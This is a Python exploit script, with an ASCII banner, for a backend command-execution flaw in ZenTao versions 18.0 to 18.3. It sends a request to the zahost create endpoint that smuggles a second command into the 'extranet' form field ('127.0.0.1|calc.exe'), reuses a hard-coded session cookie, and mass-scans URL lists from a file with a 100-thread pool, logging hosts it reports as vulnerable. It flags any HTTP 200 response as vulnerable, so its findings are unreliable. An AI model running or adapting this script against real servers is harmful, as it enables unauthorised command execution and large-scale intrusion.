#禅道v18.0-v18.3后台命令执行
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """       _                     _             _____   _____ ______  
      | |                   | |           |  __ \ / ____|  ____| 
   ___| |__   __ _ _ __   __| | __ _  ___ | |__) | |    | |__    
  / __| '_ \ / _` | '_ \ / _` |/ _` |/ _ \|  _  /| |    |  __|   
 | (__| | | | (_| | | | | (_| | (_| | (_) | | \ \| |____| |____  
  \___|_| |_|\__,_|_| |_|\__,_|\__,_|\___/|_|  \_\\_____|______|               
                                            author :CHKer
                                            version:1.0.0
  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="禅道v18.0-v18.3后台命令执行")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = "/zentaopms/www/index.php?m=zahost&f=create"
    headers = {
        'Host':'127.0.0.1',
        'UserAgent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/110.0Accept:application/json,text/javascript,*/*;q=0.01',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate',
        'Referer':'http://127.0.0.1/zentaopms/www/index.php?m=zahost&f=create',
        'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest',
        'Content-Length':'134',
        'Origin':'http://127.0.0.1',
        'Connection':'close',
        'Cookie':'zentaosid=dhjpu2i3g51l6j5eba85aql27f;lang=zhcn;device=desktop;theme=default;tab=qa;windowWidth=1632;windowHeight=783',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data = "vsoft=kvm&hostType=physical&name=penson&extranet=127.0.0.1%7Ccalc.exe&cpuCores=2&memory=16&diskSize=16&desc=&uid=640be59da4851&type=za"
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('result54.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()